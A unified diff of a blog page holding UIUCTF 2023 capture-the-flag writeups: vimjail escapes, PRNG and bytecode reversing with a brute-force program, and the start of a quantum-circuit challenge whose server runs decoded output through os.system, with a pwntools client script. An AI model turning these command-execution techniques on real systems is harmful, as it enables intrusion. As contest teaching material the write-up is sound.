@@ -1,4 +1,4 @@
-<!doctype html><html lang=en-us><head><title>UIUCTF 2023 Writeups | flocto</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.115.1"><link rel=canonical href=/writeups/2023/uiuctf/uiuctf-writeups/><link href=/sass/main.min.57d92008c47faccb486578aa238fe68bdeeb4a0b32c7f43a3dd381869319736d.css rel=stylesheet></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a href=/><span class=terminal>fl@cto ~ $</span></a></div><nav class=headerLinks><ul><li><a href=/about title>~/about</a></li><li><a href=/projects title>~/projects</a></li><li><a href=/writeups title>~/writeups</a></li><li><a href=/blog title>~/blog</a></li><li><a href=/ style=align-items:center;justify-content:center><img style=width:30px;height:30px;border-radius:15px;vertical-align:text-bottom src=/profile.png alt=Home></a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>UIUCTF 2023 Writeups</h1><ul class=tagList><li class=tagItem><a class=tagLink href=/tags/2023/>2023</a></li><li class=tagItem><a class=tagLink href=/tags/misc/>misc</a></li><li class=tagItem><a class=tagLink href=/tags/rev/>rev</a></li><li class=tagItem><a class=tagLink href=/tags/uiuctf/>uiuctf</a></li></ul><div><p>Once again another banger CTF from SigPwny, including a cool theme that I completely avoided to solve challenges faster. 😂😂😂 <del><em>(jk the theme was actually cool tho)</em></del></p><p>Anyway, I ended up solving quite a few challenges in misc/rev, so here&rsquo;s writeups for both vimjails, <a href=#geoguessr->geoguessr</a>, <a href=#pwnykey>pwnykey</a>, and [Schrodinger&rsquo;s Cat](not done).</p><h1 id=vimjail-1-and-15>Vimjail 1 (and 1.5)</h1><p>BTW, as a disclaimer, these vimjail writeups cover a solution that solves both the original and the .5 updated version, and does not cover the cheese that was patched.</p><p>Anyway, starting with Vimjail 1, we&rsquo;re given this setup.</p><p>filename=vimrc</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>set nocompatible
+<!doctype html><html lang=en-us><head><title>UIUCTF 2023 Writeups | flocto</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.115.1"><link rel=canonical href=/writeups/2023/uiuctf/uiuctf-writeups/><link href=/sass/main.min.57d92008c47faccb486578aa238fe68bdeeb4a0b32c7f43a3dd381869319736d.css rel=stylesheet></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a href=/><span class=terminal>fl@cto ~ $</span></a></div><nav class=headerLinks><ul><li><a href=/about title>~/about</a></li><li><a href=/projects title>~/projects</a></li><li><a href=/writeups title>~/writeups</a></li><li><a href=/blog title>~/blog</a></li><li><a href=/ style=align-items:center;justify-content:center><img style=width:30px;height:30px;border-radius:15px;vertical-align:text-bottom src=/profile.png alt=Home></a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>UIUCTF 2023 Writeups</h1><ul class=tagList><li class=tagItem><a class=tagLink href=/tags/2023/>2023</a></li><li class=tagItem><a class=tagLink href=/tags/misc/>misc</a></li><li class=tagItem><a class=tagLink href=/tags/rev/>rev</a></li><li class=tagItem><a class=tagLink href=/tags/uiuctf/>uiuctf</a></li></ul><div><p>Once again another banger CTF from SigPwny, including a cool theme that I completely avoided to solve challenges faster. 😂😂😂 <del><em>(jk the theme was actually cool tho)</em></del></p><p>Anyway, I ended up solving quite a few challenges in misc/rev, so here&rsquo;s writeups for both vimjails, <a href=#geoguessr->geoguessr</a>, <a href=#pwnykey>pwnykey</a>, and <a href=#schr%C3%B6dingers-cat>Schrodinger&rsquo;s Cat</a>.</p><h1 id=vimjail-1-and-15>Vimjail 1 (and 1.5)</h1><p>BTW, as a disclaimer, these vimjail writeups cover a solution that solves both the original and the .5 updated version, and does not cover the cheese that was patched.</p><p>Anyway, starting with Vimjail 1, we&rsquo;re given this setup.</p><p>filename=vimrc</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>set nocompatible
 </span></span><span style=display:flex><span>set insertmode
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>inoremap &lt;c-o&gt; nope
@@ -135,7 +135,7 @@ Since we&rsquo;re inserting a character, the vimrc replacement doesn&rsquo;t app
 </span></span><span style=display:flex><span>random-float
 </span></span><span style=display:flex><span>math/rng-uniform
 </span></span><span style=display:flex><span>(random-float min max)
-</span></span></code></pre></div><p>Since we know this is a game about guessing coordinates, we can assume it&rsquo;s randomly generating the latitude and longitude.</p><p>But instead of painstakingly reversing this code, let&rsquo;s just reimplement what the original code would have been like.</p><p>We can assume based off the first part of interest that <code>math/rng</code> gets seeded with <code>os/time</code>.</p><p>Then, two random floats are generated, calling <code>math/rng-uniform</code>, which generates a random number in <code>[0, 1)</code>. The <code>random-float</code> function also seems to take in a min and a max, so logically, the most reasonable implementation would look like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>random-float = math/rng-uniform # [0, 1)
+</span></span></code></pre></div><p>Since we know this is a game about guessing coordinates, we can assume it&rsquo;s randomly generating the latitude and longitude.</p><p>But instead of painstakingly reversing this code, let&rsquo;s just reimplement what the original code would have been like.</p><p>We can assume based off the first part of interest that <code>math/rng</code> gets seeded with <code>os/time</code>.</p><p>Then, two random floats are generated, calling <a href=https://janet-lang.org/api/math.html#math/rng-uniform><code>math/rng-uniform</code>, which generates a random number in <code>[0, 1)</code></a>. The <code>random-float</code> function also seems to take in a min and a max, so logically, the most reasonable implementation would look like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>random-float = math/rng-uniform # [0, 1)
 </span></span><span style=display:flex><span>random-float *= (max - min)
 </span></span><span style=display:flex><span>random-float += min
 </span></span><span style=display:flex><span># or in one line
@@ -275,7 +275,7 @@ proc inline_F8(par0): @4924
 proc inline_F14(par0): @5292
    0:     CALL &#34;0123456789ABCDFGHJKLMNPQRSTUWXYZ&#34;.&#34;includes&#34;(par0)
   14:     RETURN !ret_val()
-</code></pre><p>Following the logic, we see that each splits each segment again into individual letters, then checks to see if the letters are in <code>0123456789ABCDFGHJKLMNPQRSTUWXYZ</code>. If any are not, it throws an error.</p><p>The next part calls <code>inline_F9</code> on each segment, which then calls <code>inline_F15</code> on each letter in each segment. <code>inline_F15</code> just returns the index of the letter in the previously establish alphabet, so this entire process just maps all the letters to their respective indices:</p><pre tabindex=0><code> 326:     CALL {G5}.&#34;map&#34;(CLOSURE(inline_F9))
+</code></pre><p>Following the logic, we see that each splits each segment again into individual letters, then checks to see if the letters are in <code>0123456789ABCDFGHJKLMNPQRSTUWXYZ</code>. If any are not, it throws an error.</p><p>The next part calls <code>inline_F9</code> on each segment, which then calls <code>inline_F15</code> on each letter in each segment. <code>inline_F15</code> just returns the index of the letter in the previously established alphabet, so this entire process just maps all the letters to their respective indices:</p><pre tabindex=0><code> 326:     CALL {G5}.&#34;map&#34;(CLOSURE(inline_F9))
 ...
 proc inline_F9(par0): @4956
    0:     CALL par0.&#34;split&#34;(&#34;&#34;)
@@ -295,6 +295,7 @@ ex: &#34;ABCDE&#34; -&gt; [10, 11, 12, 13, 14]
  402:     {G10} := loc0[4]
 </code></pre><h3 id=check-1>Check 1</h3><p>The next part checks <code>G6</code>:</p><pre tabindex=0><code> 415:     CALL ds.&#34;format&#34;(&#34;{0}&#34;, {G6})
  429:     loc0 := ret_val()
+
  439:     ALLOC_ARRAY initial_size=5
  448:     loc1 := ret_val()
  458:     loc1[0] := 30
@@ -407,7 +408,7 @@ the PRNG is called, we can pre-calculate the value <code>G13</code> when it will
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>print(target)
 </span></span><span style=display:flex><span><span style=color:#75715e># [1563607211, -1897660814, -1748793603]</span>
-</span></span></code></pre></div><p>As for solving the actual xorshift part, after a bit of mucking around with Z3 and reversing, we realized that brute force was actually feasible. This is because there are only 5 numbers in the state, and each number can only have an initial value in 0-31, since there are only 32 letters in the alphabet.</p><p>That leaves a total search space of <code>2^(5*5) = 33554432</code> which is definitely small enough to brute force.</p><p>I ended up coding my brute force in c++, directly translating the logic over:</p><p>filename=brute.cpp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
+</span></span></code></pre></div><p>As for solving the actual xorshift part, after a bit of mucking around with Z3 and reversing, we realized that brute force was actually feasible. This is because there are only 5 numbers in the state, and each number can only have an initial value in 0-31, since there are only 32 letters in the alphabet.</p><p>That leaves a total search space of $2^{5 \cdot 5}$ = <code>33554432</code> which is definitely small enough to brute force.</p><p>I ended up coding my brute force in c++, directly translating the logic over:</p><p>filename=brute.cpp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;vector&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
@@ -572,7 +573,561 @@ found! 14 11 22 2 27
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>    given_sv, given_n <span style=color:#f92672>=</span> normalization(<span style=color:#e6db74>&#34;echo &#39;Hello, world!&#39;&#34;</span>)
 </span></span><span style=display:flex><span>    print_given(given_sv, given_n)
-</span></span></code></pre></div><p>The specific implemenetation of <code>normalization</code> and <code>print_given</code> aren&rsquo;t important yet, but just know that <code>normalization</code> returns a statevector and a normalization constant and <code>print_given</code> is just an extension of the welcome message.</p><p>A <a href=https://en.wikipedia.org/wiki/Quantum_state>statevector</a> is way to represent the possible states of a quantum system, and records the probabilities of every possible combination of qubit measurements. For example, the statevector of a single qubit at the start of a circuit is <code>[1, 0]</code>, since it will always record 0 when measured. A statevector that records <code>n</code> qubits requires <code>2^n</code> values.</p><p>A key property of statevectors is that the sum of the squares of all values in the statevector must equal 1. This is called normalization, and the normalization constant is what the statevector is divided by to ensure it is normalized.</p><p>In this case, the statevector is 32 values long, and represents the 5 qubits used in the circuit. In the output of <code>print_given</code>, we can also see that the normalization constant is <code>419.1873089681986</code>.</p></div></div></main></div><script>function handle_open(e){let t=e.target;e.target.tagName==="SUMMARY"&&(t=e.target.querySelector(".code-summary-inner")),t.classList.toggle("open"),t.classList.contains("open")?t.textContent="Click to collapse "+t.textContent.split(" ").slice(3).join(" "):t.textContent="Click to expand "+t.textContent.split(" ").slice(3).join(" ")}let code_divs=document.querySelectorAll("div.highlight"),to_remove=[];for(let e of code_divs){let t="",n=e.previousElementSibling;n.tagName=="P"&&(n=n.textContent,n.startsWith("filename")&&(t=n.split("=")[1].trim(),to_remove.push(e.previousElementSibling)));let s=e.querySelector("pre code"),o=s.textContent.split(`
+</span></span></code></pre></div><p>The specific implementation of <code>normalization</code> and <code>print_given</code> aren&rsquo;t important yet, but just know that <code>normalization</code> returns a statevector and a normalization constant while <code>print_given</code> just executes and prints out a fixed quantum circuit.</p><p>A <a href=https://en.wikipedia.org/wiki/Quantum_state>statevector</a> is way to represent the possible states of a collection of qubits, and records the probabilities of every possible combination of qubit measurements. Qubits, like classical bits, can be in one of two states, 0 or 1, but unlike classical bits, they don&rsquo;t have to be in one state or the other. Instead, they can be in a superposition of both states, and the statevector records the probability of measuring the qubits in each state.</p><p>For example, the two simplest statevectors are the zero and one position that always collapse to 0 and 1 respectively, and they look like:</p><p>$$|0\rangle = \begin{bmatrix}
+1 \\ 0
+\end{bmatrix}$$</p><p>$$|1\rangle = \begin{bmatrix}
+0 \\ 1
+\end{bmatrix}$$</p><p>On the other hand, a statevector of a qubit with an equal chance of being measured as 0 or 1 would look like:</p><p>$$|+\rangle = \begin{bmatrix}
+\frac{1}{\sqrt{2}} \\ \frac{1}{\sqrt{2}}
+\end{bmatrix}$$</p><p>A key property of statevectors is that the sum of the squares of all values in the statevector must equal 1. This is called normalization, and the normalization constant is what the statevector is divided by to ensure it is normalized. In the above example, each value in the state vector is $\frac{1}{\sqrt{2}}$ rather than $\frac{1}{2}$ because $(\frac{1}{\sqrt{2}})^2 + (\frac{1}{\sqrt{2}})^2 = 1$.</p><p>A statevector that records $n$ qubits requires $2^n$ values. In this case, the statevector is 32 values long, and represents the 5 qubits used in the circuit. In the output of <code>print_given</code>, we can also see that the normalization constant is <code>419.1873089681986</code>.</p><p>Additionally <code>print_given</code> seems to execute the result of the its fixed quantum circuit with <code>os.system</code>. Since we know the statevector that gets passed in is created from <code>echo 'Hello, world!'</code>, we can assume the output of <code>system</code> is the result of executing <code>echo 'Hello, world!'</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>print_given</span>(sv, n): <span style=color:#75715e># sv is the statevector from normalization(&#34;echo &#39;Hello, world!&#39;&#34;)</span>
+</span></span><span style=display:flex><span>    placeholder <span style=color:#f92672>=</span> QuantumCircuit(WIRES, name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Your Circ Here&#34;</span>)
+</span></span><span style=display:flex><span>    placeholder<span style=color:#f92672>.</span>i(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    circ <span style=color:#f92672>=</span> make_circ(sv, placeholder)
+</span></span><span style=display:flex><span>    print(circ<span style=color:#f92672>.</span>draw(style<span style=color:#f92672>=</span>{
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;displaytext&#34;</span>: {
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;state_preparation&#34;</span>: <span style=color:#e6db74>&#34;&lt;&gt;&#34;</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }))
+</span></span><span style=display:flex><span>    new_sv <span style=color:#f92672>=</span> qi<span style=color:#f92672>.</span>Statevector<span style=color:#f92672>.</span>from_instruction(circ)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Normalization constant: </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Executing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># transform just turns the statevector back into ASCII by multiplying each value by the normalization constant and rounding to the nearest integer</span>
+</span></span><span style=display:flex><span>    system(transform(new_sv, n))
+</span></span></code></pre></div><p>Connecting to the remote server, we can confirm this for ourselves:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>== proof-of-work: disabled ==
+</span></span><span style=display:flex><span>$ nc schrodingers-cat.chal.uiuc.tf 1337
+</span></span><span style=display:flex><span>Welcome to the Quantum Secure Shell. Instead of dealing with pesky encryption, just embed your commands into our quantum computer! I batched the next command in with yours, hope you&#39;re ok with that!
+</span></span><span style=display:flex><span>     ┌─────────────────┐┌───────────────────────┐
+</span></span><span style=display:flex><span>q_0: ┤0                ├┤0                      ├
+</span></span><span style=display:flex><span>     │                 ││                       │
+</span></span><span style=display:flex><span>q_1: ┤1                ├┤1                      ├
+</span></span><span style=display:flex><span>     │                 ││                       │
+</span></span><span style=display:flex><span>q_2: ┤2 Your Circ Here ├┤2 echo &#39;Hello, world!&#39; ├
+</span></span><span style=display:flex><span>     │                 ││                       │
+</span></span><span style=display:flex><span>q_3: ┤3                ├┤3                      ├
+</span></span><span style=display:flex><span>     │                 ││                       │
+</span></span><span style=display:flex><span>q_4: ┤4                ├┤4                      ├
+</span></span><span style=display:flex><span>     └─────────────────┘└───────────────────────┘
+</span></span><span style=display:flex><span>Normalization constant: 419.1873089681986
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Executing...
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Hello, world!
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Please type your OpenQASM circuit as a base64 encoded string: 
+</span></span></code></pre></div><p>From the server output, it seems we need to construct our own quantum circuit that gets prepended before the <code>echo 'Hello, world!'</code> circuit. Then, after the server executes the entire circuit, the result gets passed into <code>system</code>. Since this is a CTF challenge, we probably want to read <code>/flag.txt</code> or something similar.</p><p>Now continuing down <code>main</code>, we see that it takes in a quantum circuit as a base64 string, decodes it to a quantum circuit object, then checks to make sure it only operates on 5 qubits like the given circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    qasm_str <span style=color:#f92672>=</span> b64decode(input(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Please type your OpenQASM circuit as a base64 encoded string: &#34;</span>))<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Error decoding b64!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    circ <span style=color:#f92672>=</span> QuantumCircuit<span style=color:#f92672>.</span>from_qasm_str(qasm_str)
+</span></span><span style=display:flex><span>    circ<span style=color:#f92672>.</span>remove_final_measurements(inplace<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Error processing OpenQASM file! Try decomposing your circuit into basis gates using `transpile`.&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> circ<span style=color:#f92672>.</span>num_qubits <span style=color:#f92672>!=</span> WIRES: <span style=color:#75715e># constant set to 5</span>
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Your quantum circuit acts on </span><span style=color:#e6db74>{</span>circ<span style=color:#f92672>.</span>num_qubits<span style=color:#e6db74>}</span><span style=color:#e6db74> instead of </span><span style=color:#e6db74>{</span>WIRES<span style=color:#e6db74>}</span><span style=color:#e6db74> qubits!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>0</span>)
+</span></span></code></pre></div><p>The <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.from_qasm_str.html#qiskit.circuit.QuantumCircuit.from_qasm_str><code>from_qasm_str</code></a> function populates a Qiskit QuantumCircuit object from a specified OpenQASM string, and <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.remove_final_measurements.html#qiskit.circuit.QuantumCircuit.remove_final_measurements><code>remove_final_measurements</code></a> removes any measurements from the circuit. This is because the server will be executing the statevector of the circuit, so any measurements will collapse the statevector and make it useless.</p><p>Next, the server reads in a normalization constant that we control. From before, we know this number comes from dividing the statevector from ASCII values to a normalized vector.
+It then forms the complete circuit by prepending our input to the given circuit:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    norm <span style=color:#f92672>=</span> float(input(<span style=color:#e6db74>&#34;Please enter your normalization constant (precision matters!): &#34;</span>))
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Error processing normalization constant!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    sv_circ <span style=color:#f92672>=</span> make_circ(given_sv, circ)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Circuit runtime error!&#34;</span>)
+</span></span><span style=display:flex><span>    exit(<span style=color:#ae81ff>0</span>)
+</span></span></code></pre></div><p>Finally, at the very end, the server calculates the final statevector from the entire circuit, transforms it uses our normalization constant, and executes it using <code>system</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>print(sv_circ<span style=color:#f92672>.</span>draw())
+</span></span><span style=display:flex><span>command <span style=color:#f92672>=</span> transform(qi<span style=color:#f92672>.</span>Statevector<span style=color:#f92672>.</span>from_instruction(sv_circ), norm)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Executing...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>system(command)
+</span></span></code></pre></div><p>From here, there&rsquo;s a lot of ways we can begin approaching the problem. But first, let&rsquo;s take one final look at a function from the server:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>transform</span>(sv, n):
+</span></span><span style=display:flex><span>    legal <span style=color:#f92672>=</span> <span style=color:#66d9ef>lambda</span> c: ord(<span style=color:#e6db74>&#39; &#39;</span>) <span style=color:#f92672>&lt;=</span> c <span style=color:#f92672>and</span> c <span style=color:#f92672>&lt;=</span> ord(<span style=color:#e6db74>&#39;~&#39;</span>)
+</span></span><span style=display:flex><span>    renormalized <span style=color:#f92672>=</span> [float(i<span style=color:#f92672>.</span>real)<span style=color:#f92672>*</span>n <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> sv]
+</span></span><span style=display:flex><span>    rn_rounded <span style=color:#f92672>=</span> [round(i) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> renormalized]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> np<span style=color:#f92672>.</span>allclose(renormalized, rn_rounded, rtol<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>, atol<span style=color:#f92672>=</span><span style=color:#ae81ff>1e-2</span>):
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Your rehydrated statevector isn&#39;t very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.&#34;</span>)
+</span></span><span style=display:flex><span>        print(rn_rounded)
+</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> np<span style=color:#f92672>.</span>any([<span style=color:#f92672>not</span> legal(c) <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> rn_rounded]):
+</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Invalid ASCII characters.&#34;</span>)
+</span></span><span style=display:flex><span>        exit(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join([chr(n) <span style=color:#66d9ef>for</span> n <span style=color:#f92672>in</span> rn_rounded])
+</span></span></code></pre></div><p>This is the function that takes the statevector and converts it back into ASCII to be executed. Note that the <code>np.allclose</code> means our multiplied statevector must be almost exactly equal to ASCII values, as the tolerance is only <code>1e-2</code>.</p><p>This means we need to be very precise with our normalization constant. Additionally, the normalization only uses the real component of the statevector. Typically, quantum statevectors include both real and imaginary components, so it&rsquo;s good to know that only the real component matters here (but it isn&rsquo;t too important).</p><h2 id=building-a-circuit>Building a circuit</h2><p>First, before we do any actual solving, let&rsquo;s try and actually send a valid quantum circuit. I&rsquo;ll be using <code>qiskit</code> here, since it&rsquo;s what the server uses and is the simplest.
+Let&rsquo;s start by creating an empty circuit with 5 qubits, and just sending that over. We can use the <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.qasm.html#qiskit.circuit.QuantumCircuit.qasm><code>.qasm()</code> function</a> to generate the OpenQASM string representation of the circuit, then encode it to base64:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> qiskit <span style=color:#f92672>import</span> QuantumCircuit
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>) <span style=color:#75715e># just an empty circuit</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>circuit <span style=color:#f92672>=</span> qc<span style=color:#f92672>.</span>qasm()
+</span></span><span style=display:flex><span>norm <span style=color:#f92672>=</span> <span style=color:#ae81ff>419.1873089681986</span> <span style=color:#75715e># let&#39;s just use the server norm for now</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64encode
+</span></span><span style=display:flex><span>circuit <span style=color:#f92672>=</span> b64encode(circuit<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> remote
+</span></span><span style=display:flex><span><span style=color:#75715e># nc schrodingers-cat.chal.uiuc.tf 1337</span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>&#34;schrodingers-cat.chal.uiuc.tf&#34;</span>, <span style=color:#ae81ff>1337</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Please type your OpenQASM circuit as a base64 encoded string: &#39;</span>, circuit)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Please enter your normalization constant (precision matters!): &#39;</span>, str(norm)<span style=color:#f92672>.</span>encode())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>rest <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>recvall()<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>print(rest)
+</span></span></code></pre></div><p>Sending this just prints <code>Hello, world!</code> as expected, since our circuit currently does nothing at all. Now, let&rsquo;s try and add a single gate to our circuit. We can use the <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.x.html#qiskit.circuit.QuantumCircuit.x><code>.x()</code> function</a> to add an <code>X</code> gate to our circuit, say on qubit 0:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>qc<span style=color:#f92672>.</span>x(<span style=color:#ae81ff>0</span>)
+</span></span></code></pre></div><p>Interestingly, this time there&rsquo;s an error about invalid ASCII characters from the transform function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>     ┌──────────────┐┌───────────────────────┐
+</span></span><span style=display:flex><span>q_0: ┤0             ├┤0                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_1: ┤1             ├┤1                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_2: ┤2 circuit-298 ├┤2 echo &#39;Hello, world!&#39; ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_3: ┤3             ├┤3                      ├
+</span></span><span style=display:flex><span>     │              ││                       │
+</span></span><span style=display:flex><span>q_4: ┤4             ├┤4                      ├
+</span></span><span style=display:flex><span>     └──────────────┘└───────────────────────┘
+</span></span><span style=display:flex><span>Invalid ASCII characters.
+</span></span></code></pre></div><p>Interesting&mldr; let&rsquo;s try a different gate. How about the <a href=https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.h.html#qiskit.circuit.QuantumCircuit.h>H gate</a> this time?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>qc <span style=color:#f92672>=</span> QuantumCircuit(<span style=color:#ae81ff>5</span>)
